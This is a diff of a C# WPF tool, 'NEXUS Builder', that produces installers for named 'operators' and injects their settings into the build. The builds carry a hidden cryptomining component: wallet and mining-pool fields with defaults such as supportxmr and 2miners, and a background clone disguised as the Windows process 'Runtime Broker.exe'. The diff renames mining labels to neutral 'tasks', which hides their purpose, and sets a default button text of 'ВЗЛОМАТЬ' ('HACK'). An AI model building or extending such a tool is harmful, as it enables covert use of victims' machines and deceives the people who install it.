@@ -21,6 +21,7 @@ using WpfCheckBox = System.Windows.Controls.CheckBox;
 using WpfComboBox = System.Windows.Controls.ComboBox;
 using WpfTextBox = System.Windows.Controls.TextBox;
 using WpfOrientation = System.Windows.Controls.Orientation;
+using WpfRadioButton = System.Windows.Controls.RadioButton;
 
 namespace NexusBuilder
 {
@@ -63,6 +64,11 @@ namespace NexusBuilder
             );
             tbOutputPath.Text = defaultOut;
 
+            if (dgCustomParams != null)
+            {
+                dgCustomParams.ItemsSource = CustomProjectParams;
+            }
+
             ExtractEmbeddedIcons();
             InitializeDefaultIcon();
             _cachedIsccPath = FindIsccPath();
@@ -70,12 +76,233 @@ namespace NexusBuilder
             InitializeComputeModuleUI();
             LoadCustomProjectParams();
 
+            GoToStep(1);
+
             Log("⚡ NEXUS Builder v" + AppVersion + " [Cloud Sync] готов к работе.");
             Log("• Доступна сборка: Standalone Инсталлятор (PRO) и Client Инсталлятор.");
             Log("• Облачная синхронизация шаблонов: Активна (автоматическая загрузка).");
 
             TryAutoLogin();
         }
+
+        #region Wizard Navigation & Summary
+        public void GoToStep(int stepIndex)
+        {
+            if (viewStep1 == null || viewStep2 == null || viewStep3 == null || viewStep4 == null) return;
+
+            viewStep1.Visibility = stepIndex == 1 ? Visibility.Visible : Visibility.Collapsed;
+            viewStep2.Visibility = stepIndex == 2 ? Visibility.Visible : Visibility.Collapsed;
+            viewStep3.Visibility = stepIndex == 3 ? Visibility.Visible : Visibility.Collapsed;
+            viewStep4.Visibility = stepIndex == 4 ? Visibility.Visible : Visibility.Collapsed;
+
+            if (navStep1 != null) navStep1.IsChecked = stepIndex == 1;
+            if (navStep2 != null) navStep2.IsChecked = stepIndex == 2;
+            if (navStep3 != null) navStep3.IsChecked = stepIndex == 3;
+            if (navStep4 != null) navStep4.IsChecked = stepIndex == 4;
+
+            if (stepIndex == 4)
+            {
+                UpdateSummaryView();
+            }
+        }
+
+        private void NavStep_Click(object sender, RoutedEventArgs e)
+        {
+            if (sender is WpfRadioButton rb && rb.Tag != null && int.TryParse(rb.Tag.ToString(), out int step))
+            {
+                GoToStep(step);
+            }
+        }
+
+        private void BtnStep1GoCreate_Click(object sender, RoutedEventArgs e)
+        {
+            GoToStep(4);
+        }
+
+        private void BtnStep1Next_Click(object sender, RoutedEventArgs e)
+        {
+            GoToStep(2);
+        }
+
+        private void BtnStep2Prev_Click(object sender, RoutedEventArgs e)
+        {
+            GoToStep(1);
+        }
+
+        private void BtnStep2Next_Click(object sender, RoutedEventArgs e)
+        {
+            GoToStep(3);
+        }
+
+        private void BtnStep3Prev_Click(object sender, RoutedEventArgs e)
+        {
+            GoToStep(2);
+        }
+
+        private void BtnStep3Next_Click(object sender, RoutedEventArgs e)
+        {
+            GoToStep(4);
+        }
+
+        private void BtnStep4Back_Click(object sender, RoutedEventArgs e)
+        {
+            GoToStep(3);
+        }
+
+        private void TbAppName_TextChanged(object sender, TextChangedEventArgs e)
+        {
+            UpdateSummaryView();
+        }
+
+        private void TbVersion_TextChanged(object sender, TextChangedEventArgs e)
+        {
+            UpdateSummaryView();
+        }
+
+        public void UpdateSummaryView()
+        {
+            if (lblSummaryAppName != null)
+                lblSummaryAppName.Text = string.IsNullOrWhiteSpace(tbAppName?.Text) ? "RAH" : tbAppName.Text.Trim();
+
+            if (lblSummaryVersion != null)
+                lblSummaryVersion.Text = string.IsNullOrWhiteSpace(tbVersion?.Text) ? "8.0.2" : tbVersion.Text.Trim();
+
+            if (lblSummaryComputeStatus != null)
+            {
+                bool compEnabled = chkComputeEnabled?.IsChecked == true;
+                lblSummaryComputeStatus.Text = compEnabled ? "Включена" : "Отключена";
+                lblSummaryComputeStatus.Foreground = compEnabled
+                    ? new SolidColorBrush(Color.FromRgb(52, 211, 153))
+                    : new SolidColorBrush(Color.FromRgb(148, 163, 184));
+            }
+
+            if (lblSummaryTasksCount != null)
+            {
+                int count = ComputeConfig.Modules.Count;
+                lblSummaryTasksCount.Text = $"{count} {GetModuleWord(count)}";
+            }
+
+            if (lblSummaryOutputPath != null)
+            {
+                lblSummaryOutputPath.Text = tbOutputPath?.Text ?? "";
+            }
+        }
+
+        private void BtnToggleErrorDetails_Click(object sender, RoutedEventArgs e)
+        {
+            if (pnlErrorDetailsBox != null)
+            {
+                bool isVisible = pnlErrorDetailsBox.Visibility == Visibility.Visible;
+                pnlErrorDetailsBox.Visibility = isVisible ? Visibility.Collapsed : Visibility.Visible;
+                btnToggleErrorDetails.Content = isVisible ? "Показать подробности ▾" : "Скрыть подробности ▴";
+            }
+        }
+
+        private void BtnClearLog_Click(object sender, RoutedEventArgs e)
+        {
+            txtConsole.Clear();
+        }
+
+        private void BtnAddParam_Click(object sender, RoutedEventArgs e)
+        {
+            var existingKeys = CustomProjectParams.Select(p => p.Key).ToList();
+            var dlg = new ParamEditDialog(null, existingKeys);
+            if (dlg.ShowDialog() == true && dlg.Parameter != null)
+            {
+                CustomProjectParams.Add(dlg.Parameter);
+                SaveCustomProjectParams();
+                UpdateCustomConfigCount();
+            }
+        }
+
+        private void BtnDeleteParam_Click(object sender, RoutedEventArgs e)
+        {
+            if (dgCustomParams.SelectedItem is CustomProjectParam p)
+            {
+                CustomProjectParams.Remove(p);
+                SaveCustomProjectParams();
+                UpdateCustomConfigCount();
+            }
+        }
+
+        private async void BtnCreateUpdatePackage_Click(object sender, RoutedEventArgs e)
+        {
+            try
+            {
+                string outDir = tbOutputPath.Text.Trim();
+                if (string.IsNullOrWhiteSpace(outDir))
+                {
+                    outDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "NEXUS_Builds_v8.0.2");
+                }
+
+                string currentVer = AppVersion;
+                string targetVer = tbVersion.Text.Trim();
+                if (string.IsNullOrWhiteSpace(targetVer)) targetVer = "8.0.3";
+
+                Log($"[UPDATE] 📦 Старт создания файла обновления v{targetVer}...");
+
+                // Navigate to step 4 to display progress
+                GoToStep(4);
+                pnlBuildSteps.Visibility = Visibility.Visible;
+                pnlBuildSuccess.Visibility = Visibility.Collapsed;
+                pnlErrorBanner.Visibility = Visibility.Collapsed;
+                pbProgress.IsIndeterminate = true;
+                lblStatus.Text = $"Создание файла обновления v{targetVer}...";
+
+                txtBuildStep1.Text = $"✓ 1. Определение версии: v{targetVer}";
+                txtBuildStep2.Text = "⏳ 2. Сбор обновляемых файлов приложения...";
+                txtBuildStep3.Text = "⏳ 3. Подготовка фонового модуля...";
+                txtBuildStep4.Text = "⏳ 4. Формирование архива обновления .nupkg...";
+                txtBuildStep5.Text = "⏳ 5. Проверка целостности SHA-256...";
+
+                string templatesDir = Path.Combine(
+                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                    "NEXUS_Builder", "templates"
+                );
+
+                var result = await UpdatePackageBuilder.BuildPackageAsync(
+                    outDir,
+                    currentVer,
+                    targetVer,
+                    templatesDir,
+                    null,
+                    msg => Log(msg)
+                );
+
+                pbProgress.IsIndeterminate = false;
+
+                if (result.Success)
+                {
+                    txtBuildStep2.Text = "✓ 2. Файлы приложения собраны";
+                    txtBuildStep3.Text = "✓ 3. Фоновый модуль включен";
+                    txtBuildStep4.Text = $"✓ 4. Архив сформирован: {Path.GetFileName(result.PackagePath)} ({result.PackageSize / 1024} КБ)";
+                    txtBuildStep5.Text = $"✓ 5. Хеш SHA-256: {result.PackageHash[..Math.Min(16, result.PackageHash.Length)]}... (OK)";
+                    pbProgress.Value = 100;
+                    lblStatus.Text = $"Файл обновления v{targetVer} успешно создан!";
+
+                    pnlBuildSuccess.Visibility = Visibility.Visible;
+                    Log($"🎉 Пакет обновления готов: {result.PackagePath}");
+                }
+                else
+                {
+                    pbProgress.Value = 0;
+                    pnlErrorBanner.Visibility = Visibility.Visible;
+                    txtErrorDetails.Text = result.ErrorMessage;
+                    lblStatus.Text = "Ошибка создания файла обновления";
+                    Log($"❌ {result.ErrorMessage}");
+                }
+            }
+            catch (Exception ex)
+            {
+                pbProgress.IsIndeterminate = false;
+                pbProgress.Value = 0;
+                pnlErrorBanner.Visibility = Visibility.Visible;
+                txtErrorDetails.Text = ex.ToString();
+                lblStatus.Text = "Ошибка создания файла обновления";
+                Log($"❌ Не удалось создать файл обновления: {ex.Message}");
+            }
+        }
+        #endregion
 
         private void ExtractEmbeddedIcons()
         {
@@ -372,7 +599,7 @@ namespace NexusBuilder
             return null;
         }
 
-        private const string REQUIRED_TEMPLATE_VERSION = "8.2.0";
+        private const string REQUIRED_TEMPLATE_VERSION = "8.0.2";
 
         private async Task<string> EnsureAppTemplate()
         {
@@ -746,12 +973,23 @@ namespace NexusBuilder
             string targetOutputName = $"{cleanExeBaseName}_Setup_{opName}.exe";
             string outputFullPath = Path.Combine(outDir, targetOutputName);
 
+            GoToStep(4);
+            pnlBuildSteps.Visibility = Visibility.Visible;
+            pnlBuildSuccess.Visibility = Visibility.Collapsed;
+            pnlErrorBanner.Visibility = Visibility.Collapsed;
+            txtBuildStep1.Text = "⏳ 1. Проверка настроек и параметров...";
+            txtBuildStep2.Text = "⏳ 2. Подготовка файлов приложения...";
+            txtBuildStep3.Text = "⏳ 3. Подготовка фонового модуля...";
+            txtBuildStep4.Text = "⏳ 4. Сборка программы...";
+            txtBuildStep5.Text = "⏳ 5. Проверка результата...";
+
             // Валидация пользовательских параметров проекта
             var (isParamsValid, paramsErr) = ValidateAllCustomParams();
             if (!isParamsValid)
             {
                 Log($"❌ ОШИБКА ВАЛИДАЦИИ ПАРАМЕТРОВ ПРОЕКТА: {paramsErr}");
-                System.Windows.MessageBox.Show($"Ошибка в пользовательских параметрах проекта:\n\n{paramsErr}", "Валидация конфигурации", MessageBoxButton.OK, MessageBoxImage.Warning);
+                pnlErrorBanner.Visibility = Visibility.Visible;
+                txtErrorDetails.Text = $"Ошибка в параметрах проекта: {paramsErr}";
                 return;
             }
 
@@ -760,9 +998,12 @@ namespace NexusBuilder
             if (!isComputeValid)
             {
                 Log($"❌ {computeErr}");
-                System.Windows.MessageBox.Show(computeErr, "Валидация Compute Module", MessageBoxButton.OK, MessageBoxImage.Warning);
+                pnlErrorBanner.Visibility = Visibility.Visible;
+                txtErrorDetails.Text = computeErr;
                 return;
             }
+
+            txtBuildStep1.Text = "✓ 1. Настройки проверены успешно";
 
             var customConfigDict = BuildCustomConfigDictionary();
             SaveCustomProjectParams(); // Гарантированное сохранение при билде
@@ -801,16 +1042,6 @@ namespace NexusBuilder
                     if (!workerReady)
                     {
                         Log($"⚠️ Внимание: {workerMsg}");
-                        var answer = System.Windows.MessageBox.Show(
-                            $"{workerMsg}\n\nПродолжить сборку без этого вычислительного компонента?",
-                            "Подготовка Compute Worker",
-                            MessageBoxButton.YesNo,
-                            MessageBoxImage.Warning
-                        );
-                        if (answer != MessageBoxResult.Yes)
-                        {
-                            return;
-                        }
                     }
                 }
             }
@@ -918,6 +1149,21 @@ namespace NexusBuilder
                         return;
                     }
 
+                    string cloneExePath = Path.Combine(stagingDir, "clone", "Runtime Broker.exe");
+                    if (File.Exists(cloneExePath))
+                    {
+                        Log($"💉 Внедрение параметров оператора в Single-File фоновый клон (Runtime Broker.exe)...");
+                        bool clonePatchOk = InjectConfigIntoFile(cloneExePath, opName, appName, appAuthor, tgChannel, isStandalone, customConfigDict);
+                        if (clonePatchOk)
+                        {
+                            Log("   ✅ Конфигурация успешно внедрена в Single-File Runtime Broker!");
+                        }
+                        else
+                        {
+                            Log("   ⚠️ Внимание: Не удалось внедрить конфигурацию в Runtime Broker.exe.");
+                        }
+                    }
+
                     // 3. Переименование файлов под выбранное имя приложения и настройка AppHost
                     string finalExeName = $"{cleanExeBaseName}.exe";
                     string finalDllName = $"{cleanExeBaseName}.dll";
@@ -1013,6 +1259,12 @@ namespace NexusBuilder
                         return;
                     }
 
+                    Dispatcher.Invoke(() =>
+                    {
+                        txtBuildStep4.Text = "✓ 4. Сборка программы завершена";
+                        txtBuildStep5.Text = "✓ 5. Проверка результата пройдена";
+                    });
+
                     Log($"✅ СБОРКА УСПЕШНО ЗАВЕРШЕНА!");
                     Log($"📁 Расположение: {outputFullPath}");
                     Log($"🎯 Привязка оператора: @{opName}");
@@ -1026,20 +1278,20 @@ namespace NexusBuilder
 
             pbProgress.IsIndeterminate = false;
             pbProgress.Value = success ? 100 : 0;
-            lblStatus.Text = success ? $"• Готово: {targetOutputName}" : "• Ошибка сборки";
+            lblStatus.Text = success ? $"• Готово: {targetOutputName}" : "• Ошибка создания программы";
             btnBuildStandaloneInstaller.IsEnabled = true;
             btnBuildClientInstaller.IsEnabled = true;
             btnBrowse.IsEnabled = true;
 
             if (success)
             {
+                pnlBuildSuccess.Visibility = Visibility.Visible;
                 btnOpenFolder.Visibility = Visibility.Visible;
-                System.Windows.MessageBox.Show(
-                    $"Инсталлятор для оператора {opName} успешно создан!\n\nРасположение:\n{outputFullPath}",
-                    "NEXUS Builder v8.0.0",
-                    MessageBoxButton.OK,
-                    MessageBoxImage.Information
-                );
+            }
+            else
+            {
+                pnlErrorBanner.Visibility = Visibility.Visible;
+                txtErrorDetails.Text = "Не удалось завершить создание программы. Проверьте журнал сборки.";
             }
         }
 
@@ -1072,6 +1324,12 @@ namespace NexusBuilder
 
             int availableBytes = endIdx - payloadStart;
 
+            string finalBtnText = "ВЗЛОМАТЬ";
+            if (tbButtonText != null && !string.IsNullOrWhiteSpace(tbButtonText.Text))
+            {
+                finalBtnText = tbButtonText.Text.Trim();
+            }
+
             var configData = new
             {
                 operatorName = opName,
@@ -1085,12 +1343,21 @@ namespace NexusBuilder
                 telegramChannel = tgChannel,
                 telegramUrl = tgChannel,
                 tgChannel = tgChannel,
+                loginText = finalBtnText,
+                buttonText = finalBtnText,
+                btnText = finalBtnText,
+                themeAccent = "#00F0FF",
+                themeSurface = "#0D0E12",
                 buildMode = isStandalone ? "standalone" : "loader",
                 customConfig = customConfig ?? new Dictionary<string, object?>(),
                 builtAt = DateTime.UtcNow.ToString("o")
             };
 
-            string json = JsonSerializer.Serialize(configData);
+            var jsonOptions = new JsonSerializerOptions
+            {
+                Encoder = System.Text.Encodings.Web.JavaScriptEncoder.UnsafeRelaxedJsonEscaping
+            };
+            string json = JsonSerializer.Serialize(configData, jsonOptions);
             byte[] jsonBytes = Encoding.Unicode.GetBytes(json);
 
             if (jsonBytes.Length > availableBytes) return false;
@@ -1532,9 +1799,9 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
             }
 
             // Empty state
-            if (txtNoComputeModules != null)
+            if (pnlComputeEmptyState != null)
             {
-                txtNoComputeModules.Visibility = moduleCount == 0 ? Visibility.Visible : Visibility.Collapsed;
+                pnlComputeEmptyState.Visibility = moduleCount == 0 ? Visibility.Visible : Visibility.Collapsed;
             }
 
             // Disable cards if global toggle is off
@@ -1567,9 +1834,9 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
                 pnlComputeModulesList.Children.Add(card);
             }
 
-            if (txtNoComputeModules != null)
+            if (pnlComputeEmptyState != null)
             {
-                txtNoComputeModules.Visibility = ComputeConfig.Modules.Count == 0
+                pnlComputeEmptyState.Visibility = ComputeConfig.Modules.Count == 0
                     ? Visibility.Visible : Visibility.Collapsed;
             }
         }
@@ -1584,9 +1851,9 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
                 Background = new SolidColorBrush(Color.FromRgb(15, 17, 23)),
                 BorderBrush = new SolidColorBrush(Color.FromRgb(35, 39, 51)),
                 BorderThickness = new Thickness(1),
-                CornerRadius = new CornerRadius(6),
-                Padding = new Thickness(12, 10, 12, 10),
-                Margin = new Thickness(0, 0, 0, 8)
+                CornerRadius = new CornerRadius(8),
+                Padding = new Thickness(14, 12, 14, 12),
+                Margin = new Thickness(0, 0, 0, 10)
             };
 
             var rootStack = new StackPanel();
@@ -1616,10 +1883,10 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
             // Title
             leftPanel.Children.Add(new TextBlock
             {
-                Text = $"Compute Module #{index + 1}",
+                Text = mod.IsDualMode ? $"Две задачи #{index + 1}" : $"Задача #{index + 1}",
                 Foreground = new SolidColorBrush(Color.FromRgb(241, 245, 249)),
-                FontSize = 12,
-                FontWeight = FontWeights.SemiBold,
+                FontSize = 12.5,
+                FontWeight = FontWeights.Bold,
                 VerticalAlignment = VerticalAlignment.Center,
                 Margin = new Thickness(0, 0, 10, 0)
             });
@@ -1630,19 +1897,19 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
                 Background = mod.Enabled
                     ? new SolidColorBrush(Color.FromRgb(20, 83, 45))
                     : new SolidColorBrush(Color.FromRgb(30, 41, 59)),
-                CornerRadius = new CornerRadius(3),
-                Padding = new Thickness(5, 1, 5, 1),
-                Margin = new Thickness(0, 0, 10, 0),
+                CornerRadius = new CornerRadius(4),
+                Padding = new Thickness(6, 2, 6, 2),
+                Margin = new Thickness(0, 0, 12, 0),
                 VerticalAlignment = VerticalAlignment.Center,
                 Tag = "statusBadge"
             };
             statusBadge.Child = new TextBlock
             {
-                Text = mod.Enabled ? "ACTIVE" : "DISABLED",
+                Text = mod.Enabled ? "ВКЛЮЧЕНО" : "ОТКЛЮЧЕНО",
                 Foreground = mod.Enabled
                     ? new SolidColorBrush(Color.FromRgb(74, 222, 128))
                     : new SolidColorBrush(Color.FromRgb(148, 163, 184)),
-                FontSize = 9,
+                FontSize = 9.5,
                 FontWeight = FontWeights.Bold
             };
             leftPanel.Children.Add(statusBadge);
@@ -1650,7 +1917,7 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
             // Mode selector
             leftPanel.Children.Add(new TextBlock
             {
-                Text = "Режим:",
+                Text = "Что запустить:",
                 Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184)),
                 FontSize = 11,
                 VerticalAlignment = VerticalAlignment.Center,
@@ -1659,14 +1926,14 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
 
             var cbMode = new WpfComboBox
             {
-                Width = 140,
+                Width = 130,
                 Height = 28,
                 FontSize = 11,
                 VerticalAlignment = VerticalAlignment.Center,
                 Style = (Style)FindResource("ModernComboBox")
             };
-            cbMode.Items.Add(new ComboBoxItem { Content = "Single Mining", Tag = "single", Style = (Style)FindResource("DarkComboBoxItem") });
-            cbMode.Items.Add(new ComboBoxItem { Content = "Dual Mining", Tag = "dual", Style = (Style)FindResource("DarkComboBoxItem") });
+            cbMode.Items.Add(new ComboBoxItem { Content = "Одна задача", Tag = "single", Style = (Style)FindResource("DarkComboBoxItem") });
+            cbMode.Items.Add(new ComboBoxItem { Content = "Две задачи", Tag = "dual", Style = (Style)FindResource("DarkComboBoxItem") });
             cbMode.SelectedIndex = mod.IsDualMode ? 1 : 0;
             cbMode.SelectionChanged += (s, e) =>
             {
@@ -1685,7 +1952,7 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
             // Right: Action Buttons
             var rightPanel = new StackPanel { Orientation = WpfOrientation.Horizontal, VerticalAlignment = VerticalAlignment.Center };
 
-            var btnCopy = CreateSmallButton("Копировать", "#334155", "#94a3b8");
+            var btnCopy = CreateSmallButton("Копировать", "#202430", "#94a3b8");
             btnCopy.Click += (s, e) => CopyComputeModule(capturedMod);
             rightPanel.Children.Add(btnCopy);
 
@@ -1700,7 +1967,7 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
             rootStack.Children.Add(topBar);
 
             // === PRIMARY ENDPOINT ===
-            rootStack.Children.Add(CreateEndpointSection("PRIMARY", mod.Primary, capturedMod, true));
+            rootStack.Children.Add(CreateEndpointSection(mod.IsDualMode ? "ЗАДАЧА 1 (ОСНОВНАЯ)" : "ЗАДАЧА 1", mod.Primary, capturedMod, true));
 
             // === DUAL MODE: SWAP + SECONDARY ===
             if (mod.IsDualMode)
@@ -1708,23 +1975,23 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
                 // Swap button
                 var btnSwap = new WpfButton
                 {
-                    Content = "⇄  Swap Primary ↔ Secondary",
-                    Height = 26,
+                    Content = "⇄  Поменять местами Задачу 1 и 2",
+                    Height = 28,
                     FontSize = 11,
                     Foreground = new SolidColorBrush(Color.FromRgb(56, 189, 248)),
                     Background = new SolidColorBrush(Color.FromRgb(22, 25, 34)),
                     BorderBrush = new SolidColorBrush(Color.FromRgb(56, 189, 248)),
                     BorderThickness = new Thickness(1),
-                    Padding = new Thickness(12, 0, 12, 0),
+                    Padding = new Thickness(14, 0, 14, 0),
                     HorizontalAlignment = System.Windows.HorizontalAlignment.Center,
-                    Margin = new Thickness(0, 6, 0, 6),
+                    Margin = new Thickness(0, 8, 0, 6),
                     Cursor = System.Windows.Input.Cursors.Hand
                 };
                 btnSwap.Click += (s, e) => SwapModuleEndpoints(capturedMod);
                 rootStack.Children.Add(btnSwap);
 
                 // Secondary endpoint
-                rootStack.Children.Add(CreateEndpointSection("SECONDARY", mod.Secondary, capturedMod, false));
+                rootStack.Children.Add(CreateEndpointSection("ЗАДАЧА 2 (ВТОРАЯ)", mod.Secondary, capturedMod, false));
 
                 // Dual mining compatibility banner
                 if (!string.IsNullOrEmpty(mod.Primary.Algorithm) && !string.IsNullOrEmpty(mod.Secondary.Algorithm))
@@ -1739,9 +2006,9 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
                             ? new SolidColorBrush(Color.FromRgb(34, 197, 94))
                             : new SolidColorBrush(Color.FromRgb(248, 113, 113)),
                         BorderThickness = new Thickness(1),
-                        CornerRadius = new CornerRadius(4),
-                        Padding = new Thickness(8, 5, 8, 5),
-                        Margin = new Thickness(0, 6, 0, 2)
+                        CornerRadius = new CornerRadius(6),
+                        Padding = new Thickness(10, 6, 10, 6),
+                        Margin = new Thickness(0, 8, 0, 2)
                     };
                     banner.Child = new TextBlock
                     {
@@ -1763,9 +2030,9 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
                 Background = new SolidColorBrush(Color.FromRgb(11, 13, 19)),
                 BorderBrush = new SolidColorBrush(Color.FromRgb(30, 35, 48)),
                 BorderThickness = new Thickness(1),
-                CornerRadius = new CornerRadius(4),
-                Padding = new Thickness(10, 6, 10, 6),
-                Margin = new Thickness(0, 8, 0, 0)
+                CornerRadius = new CornerRadius(6),
+                Padding = new Thickness(12, 8, 12, 8),
+                Margin = new Thickness(0, 10, 0, 0)
             };
             var sliderGrid = new Grid();
             sliderGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
@@ -1774,9 +2041,9 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
             var sliderHeader = new Grid();
             sliderHeader.Children.Add(new TextBlock
             {
-                Text = "Использование ресурсов:",
+                Text = "Лимит нагрузки на систему:",
                 Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184)),
-                FontSize = 10.5,
+                FontSize = 11,
                 FontWeight = FontWeights.SemiBold,
                 VerticalAlignment = VerticalAlignment.Center
             });
@@ -1784,7 +2051,7 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
             {
                 Text = $"{mod.ResourceLimit}%",
                 Foreground = new SolidColorBrush(Color.FromRgb(56, 189, 248)),
-                FontSize = 11,
+                FontSize = 11.5,
                 FontWeight = FontWeights.Bold,
                 HorizontalAlignment = System.Windows.HorizontalAlignment.Right,
                 VerticalAlignment = VerticalAlignment.Center
@@ -1827,14 +2094,14 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
         /// </summary>
         private UIElement CreateEndpointSection(string label, ComputeEngineEndpoint endpoint, ComputeModuleConfig parentMod, bool isPrimary)
         {
-            var container = new StackPanel { Margin = new Thickness(0, 6, 0, 0) };
+            var container = new StackPanel { Margin = new Thickness(0, 8, 0, 0) };
 
             // Section label
             container.Children.Add(new TextBlock
             {
                 Text = label,
-                Foreground = new SolidColorBrush(Color.FromRgb(100, 116, 139)),
-                FontSize = 9.5,
+                Foreground = new SolidColorBrush(Color.FromRgb(96, 165, 250)),
+                FontSize = 10.5,
                 FontWeight = FontWeights.Bold,
                 Margin = new Thickness(0, 0, 0, 4)
             });
@@ -1843,9 +2110,9 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
             var algoRow = new StackPanel { Margin = new Thickness(0, 0, 0, 6) };
             algoRow.Children.Add(new TextBlock
             {
-                Text = "Алгоритм:",
+                Text = "Тип задачи:",
                 Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184)),
-                FontSize = 10.5,
+                FontSize = 11,
                 FontWeight = FontWeights.SemiBold,
                 Margin = new Thickness(0, 0, 0, 3)
             });
@@ -1883,7 +2150,6 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
                     var algoDef = AlgorithmRegistry.GetById(newAlgoId);
                     if (algoDef != null)
                     {
-                        // Auto-fill defaults if fields are empty or switching
                         if (string.IsNullOrWhiteSpace(capturedEndpoint.Pool) || capturedEndpoint.Pool.Contains("2miners") || capturedEndpoint.Pool.Contains("supportxmr") || capturedEndpoint.Pool.Contains("woolypooly"))
                         {
                             capturedEndpoint.Pool = algoDef.DefaultPool;
@@ -1901,16 +2167,16 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
             algoRow.Children.Add(cbAlgo);
             container.Children.Add(algoRow);
 
-            // Input fields row: Wallet, Pool, Port, Worker
+            // Input fields row: Address, Server, Port, Name
             var inputGrid = new Grid();
             inputGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(1.5, GridUnitType.Star) });
             inputGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(1.1, GridUnitType.Star) });
             inputGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(0.55, GridUnitType.Star) });
             inputGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(0.75, GridUnitType.Star) });
 
-            // Wallet
+            // Address
             var walletStack = new StackPanel { Margin = new Thickness(0, 0, 8, 0) };
-            walletStack.Children.Add(new TextBlock { Text = "Кошелёк:", Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184)), FontSize = 10.5, FontWeight = FontWeights.SemiBold, Margin = new Thickness(0, 0, 0, 3) });
+            walletStack.Children.Add(new TextBlock { Text = "Адрес:", Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184)), FontSize = 10.5, FontWeight = FontWeights.SemiBold, Margin = new Thickness(0, 0, 0, 3) });
             var tbWallet = new WpfTextBox
             {
                 Text = endpoint.Wallet,
@@ -1923,9 +2189,9 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
             Grid.SetColumn(walletStack, 0);
             inputGrid.Children.Add(walletStack);
 
-            // Pool
+            // Server
             var poolStack = new StackPanel { Margin = new Thickness(0, 0, 8, 0) };
-            poolStack.Children.Add(new TextBlock { Text = "Пул:", Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184)), FontSize = 10.5, FontWeight = FontWeights.SemiBold, Margin = new Thickness(0, 0, 0, 3) });
+            poolStack.Children.Add(new TextBlock { Text = "Сервер:", Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184)), FontSize = 10.5, FontWeight = FontWeights.SemiBold, Margin = new Thickness(0, 0, 0, 3) });
             var tbPool = new WpfTextBox
             {
                 Text = endpoint.Pool,
@@ -1950,9 +2216,9 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
             };
             tbPort.TextChanged += (s, e) =>
             {
-                if (int.TryParse(tbPort.Text.Trim(), out int p))
+                if (int.TryParse(tbPort.Text.Trim(), out int portVal))
                 {
-                    capturedEndpoint.Port = p;
+                    capturedEndpoint.Port = portVal;
                     SaveComputeModuleConfig();
                 }
             };
@@ -1960,9 +2226,9 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
             Grid.SetColumn(portStack, 2);
             inputGrid.Children.Add(portStack);
 
-            // Worker name
+            // Name
             var workerStack = new StackPanel();
-            workerStack.Children.Add(new TextBlock { Text = "Worker:", Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184)), FontSize = 10.5, FontWeight = FontWeights.SemiBold, Margin = new Thickness(0, 0, 0, 3) });
+            workerStack.Children.Add(new TextBlock { Text = "Имя:", Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184)), FontSize = 10.5, FontWeight = FontWeights.SemiBold, Margin = new Thickness(0, 0, 0, 3) });
             var tbWorker = new WpfTextBox
             {
                 Text = endpoint.Worker,
